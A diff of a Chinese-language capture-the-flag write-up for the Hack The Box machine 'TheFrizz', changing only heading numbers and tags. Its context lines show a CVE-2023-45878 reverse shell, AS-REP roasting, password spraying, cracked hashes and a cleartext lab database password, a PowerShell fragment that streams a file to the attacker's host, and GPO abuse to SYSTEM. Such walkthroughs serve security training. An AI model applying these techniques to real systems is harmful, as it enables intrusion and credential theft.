@@ -90,6 +90,7 @@ Nmap done: 1 IP address (1 host up) scanned in 79.24 seconds
 ![image](https://hackmd.io/_uploads/BJHW5mcxex.png)
 >  Gibbon v25.0.00
 
+## Solution
 ### 1. Search Exploit
 - 搜尋 exploit-db: `Gibbon`\
 ![image](https://hackmd.io/_uploads/Bkhxu45egl.png)
@@ -107,8 +108,7 @@ Nmap done: 1 IP address (1 host up) scanned in 79.24 seconds
 ```
 > 沒有可利用的資訊
 
-## Solution
-### 1. CVE-2023-45878 Explot
+### 2. CVE-2023-45878 Explot
 利用 CVE-2023-45878 Explot 建立 Reverse shell
 ```
 ┌──(chw㉿CHW)-[~/Tools/CVE-exploit/CVE-2023-4587_Gibbon_v25_File_Write]
@@ -179,7 +179,7 @@ The command completed successfully.
 ```
 > 查詢 User 是為了要嘗試 AS-REP Roasting
 
-### 2. AS-REP Roasting
+### 3. AS-REP Roasting
 找出無需 Kerberos preauthentication 的帳戶:
 ```
 ┌──(chw㉿CHW)-[~]
@@ -244,7 +244,7 @@ Impacket v0.13.0.dev0+20250430.174957.756ca96e - Copyright Fortra, LLC and its a
 >嘗試幾個方法都失敗
 >> 沒注意可讀 `C:\xampp` 下的資料
 
-### 3. `C:\xampp`
+### 4. `C:\xampp`
 
 看到其他 Player 上傳的 Shell 🐚
 ![image](https://hackmd.io/_uploads/BkdYyMwbel.png)
@@ -269,7 +269,7 @@ Host: localhost
 User: MrGibbonsDB
 Hash: *65A8BE9B3524B64167F92587F87F4B3D50EB2383
 ```
-### 4. Hashcat
+### 5. Hashcat
 ```
 ┌──(chw㉿CHW)-[~]
 └─$ cat TheFrizz_sql.hash 
@@ -292,7 +292,7 @@ Hash: *65A8BE9B3524B64167F92587F87F4B3D50EB2383
 > 雖然 Server 沒有 3389 port
 > 系統中存在 `C:\xampp\mysql\bin\mysql.exe`
 
-### 5. Mysql
+### 6. Mysql
 ```
 PS C:\xampp\mysql\bin> .\mysql.exe -u MrGibbonsDB -p"MisterGibbs!Parrot!?1" -e "show databases;" 
 Database
@@ -336,7 +336,7 @@ gibbonPersonID  title   surname firstName       preferredName   officialName    
 >`f.frizzle`:`067f746faca44f170c6cd9d7c4bdac6bc342c608687733f80ff784242b0b0c03`
 > Salt: `/aACFhikmNopqrRTVz2489`
 
-### 6. Hashcat again
+### 7. Hashcat again
 >[!Note]
 >[Hashcat mode](https://hashcat.net/wiki/doku.php?id=example_hashes):
 >![image](https://hackmd.io/_uploads/H1jHrQvbxl.png)
@@ -371,7 +371,7 @@ f.frizzle@10.10.11.60: Permission denied (gssapi-with-mic,keyboard-interactive).
 ```
 > 沒有權限登入 ?!
 
-### 7. Kerberoasting
+### 8. Kerberoasting
 ```
 ┌──(chw㉿CHW)-[~]
 └─$ sudo ntpdate -u 10.10.11.60                                                      
@@ -423,7 +423,7 @@ No entries found!
 ```
 > `f.frizzle` 沒有 Kerberoastable 的 SPN Service
 
-### 8. SSH
+### 9. SSH
 ```
 ┌──(root㉿CHW)-[/home/chw]
 └─# impacket-getTGT frizz.htb/f.frizzle:Jenni******Magic23 -dc-ip 10.10.11.60
@@ -477,7 +477,7 @@ PS C:\Users\f.frizzle>
 
 ## Privileges Escalation
 
-### 9. BloodHoud
+### 10. BloodHoud
 ```
 ┌──(chw㉿CHW)-[~/Desktop/upload_tools]
 └─$ python3 -m http.server 80                                                 
@@ -538,7 +538,7 @@ BloodHound 分析
 沒招了🫠 參考別人 Writeup
 👉🏻 `Recycle` ♻️ 🗑️ 🚮
 
-### 10. 回收桶 ♻️ 🗑️ 🚮
+### 11. 回收桶 ♻️ 🗑️ 🚮
 建立 COM 物件 Shell.Application (操作 Windows 檔案總管介面的物件)
 >[!Important]
 >- `Namespace(0xA)` 代表 回收桶（Recycle Bin）
@@ -566,7 +566,7 @@ Mode                 LastWriteTime         Length Name
 ```
 > 找到 wapt-backup-sunday.7z 壓縮檔，移至使用者桌面
 
-#### 10.1 回傳至 Kali
+#### 11.1 回傳至 Kali
 (Kali)
 ```
 ┌──(chw㉿CHW)-[~/Desktop/upload_tools]
@@ -603,7 +603,7 @@ $stream.Write($data, 0, $data.Length)
 $stream.Close()
 $client.Close()
 ```
-#### 10.2 分析 wapt-backup-sunday.7z
+#### 11.2 分析 wapt-backup-sunday.7z
 ```
 ┌──(chw㉿CHW)-[~]
 └─$ 7z x wapt-backup-sunday.7z
@@ -614,7 +614,7 @@ $client.Close()
 
 接著尋找 PWD 對應的 User
 
-### 11. Kerbrute passwordspray
+### 12. Kerbrute passwordspray
 尋找 user，透過 `net user /domain` 建立 TheFrizz_user.txt
 ```
 PS C:\Users\f.frizzle\Desktop> net user /domain
@@ -666,7 +666,7 @@ Version: dev (n/a) - 06/08/25 - Ronnie Flathers @ropnop
 ```
 > `M.SchoolBus@frizz.htb`:`!suBcig@******!R`
 
-#### 11.1 確認 M.SchoolBus 可執行
+#### 12.1 確認 M.SchoolBus 可執行
 
 ```
 ┌──(chw㉿CHW)-[~]
@@ -683,7 +683,7 @@ PS C:\Users\M.SchoolBus>
 PS C:\Users\M.SchoolBus>
 ```
 
-### 12. Bloodhound
+### 13. Bloodhound
 回到 BloodHound
 - 標記 `M.SchoolBus` as Owned
 ![image](https://hackmd.io/_uploads/HJr3MXQ7xl.png)
@@ -698,8 +698,8 @@ PS C:\Users\M.SchoolBus>
 ![image](https://hackmd.io/_uploads/BkJH7xN7el.png)
 
 
-### 13. Group Policy Object (GPO) Abuse
-#### 13.1 確認 Group 權限
+### 14. Group Policy Object (GPO) Abuse
+#### 14.1 確認 Group 權限
 ```
 PS C:\Users\M.SchoolBus\Desktop> ls
 
@@ -731,7 +731,7 @@ Mandatory Label\Medium Mandatory Level       Label            S-1-16-8192
 ```
 > `frizz\Group Policy Creator Owners`: frizz 內建群組的成員，可嘗試創建惡意 GPO
 
-#### 13.2 創建 New-GPO
+#### 14.2 創建 New-GPO
 
 >[!Note]
 >`New-GPO -Name <name> `：\
@@ -752,7 +752,7 @@ Order       : 3
 ```
 > `"OU=DOMAIN CONTROLLERS,DC=FRIZZ,DC=HTB"`: 把這個 GPO 連到「Domain Controllers」OU
 
-#### 13.3 利用 SharpGPOAbuse.exe
+#### 14.3 利用 SharpGPOAbuse.exe
 ![image](https://hackmd.io/_uploads/BJiIPkjtxl.png)\
 ( Kali 傳入 `SharpGPOAbuse.exe` )
 ```
@@ -817,4 +817,4 @@ nt authority\system
 ![image](https://hackmd.io/_uploads/HJCocksKxl.png)
 
 
-###### tags: `HTB` `Web` `CTF` `Windows`
+###### tags: `HTB` `Web` `CTF` `Windows` `GPO Abuse`
